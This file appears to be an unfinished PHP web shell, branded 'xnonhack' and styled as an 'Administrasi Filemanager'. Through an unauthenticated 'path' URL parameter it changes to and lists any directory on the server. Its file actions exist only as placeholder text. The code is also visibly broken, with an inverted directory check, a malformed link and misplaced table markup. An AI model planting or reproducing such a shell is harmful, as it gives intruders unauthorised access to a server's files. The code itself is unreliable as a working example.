<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

    <title></title>
  </head>
  <style type="text/css">
  	.icon {
  		width:25px;
  		height:25px;
  	}
  </style>
  <body>
    
    <div class="pos-f-t">
  <div class="collapse" id="navbarToggleExternalContent">
    <div class="bg-dark p-4">
      <h4 class="text-white">Administrasi</h4>
      <span class="text-muted">Filemanager</span>
    </div>
  </div>
  <nav class="navbar navbar-dark bg-dark">
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarToggleExternalContent" aria-controls="navbarToggleExternalContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
  </nav>
</div>
<?php
function cwd() {
  if (isset($_GET['path'])) {
    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, $_GET['path']);
    @chdir($cwd);
  } else {
    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, @getcwd());
  } return $cwd;
}
function pwd() {
  $dir = @explode(DIRECTORY_SEPARATOR, @cwd());
  foreach ($dir as $key => $pwd) {
    print("<a href='?path=");
    for ($i=0; $i <= $key ; $i++) { 
      print($dir[$i]);
      if ($i != $key) {
        print(DIRECTORY_SEPARATOR);
      }
    } print("'>".$pwd."</a>/");
  }
}
function filemanager() {
	if (!is_dir(cwd() === true)) {
		if (!is_readable(cwd())) {
			?><span>can't open directory. ( not readable )</span> <?php
		} else {
			?> <table class="table">
				<thead class="thead-light">
				<tr>
					<th>Filename</th>
					<th>Size</th>
					<th>Permission</th>
					<th>Action</th>
				</tr>
				</thead>
				<?php 
				$scandir = scandir(cwd());
				foreach ($scandir as $dir) {
					if (!is_dir(cwd().'/'.$dir)) continue;
					if ($dir === '..') {
						$href = '<a href="?path='.$dir.'">'.$dir.'</a>';
					} elseif($dir === '.') {
						$href = '<a href="?path='.@cwd().'">'.$dir.'</a>';
					} else {
						$href = '<a href="?path="'.$dir.'/'.@cwd().'">'.$dir.'</a>';
					}
					if ($dir === '.' || $dir === '..') {
						$action = '<span>newfile</span> | <span>newfolder</span>';
					} else {
						$action = '<span>rename</span> | <span>delete</span>';
					}
					?>
					<tr>
						<td>
							<img class="icon" src='https://image.flaticon.com/icons/svg/716/716784.svg'><?php print $href ?>
						</td>
						<td>
							size
						</td>
						<td>
							permission
						</td>
						<td>
							action
						</td>
					</tr>
					<?php
				}
		}
	} else {
		?> can't open directory. <?php
	}
	foreach($scandir as $file) {
		if(!is_file(cwd().'/'.$file)) continue;
		?>
		<tr>
			<td>
				<img src=""><?php print $file ?>
			</td>
			<td>
				size
			</td>
			<td>
				permission
			</td>
			<td>
				action
			</td>
		</tr> 
		<?php
	}
}
filemanager();
?>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <thead class="thead-light">
    	<tr>
    		<th colspan="4" align="center">xnonhack</th>
    	</tr>
    </thead>
    </table> 
  </body>
</html>
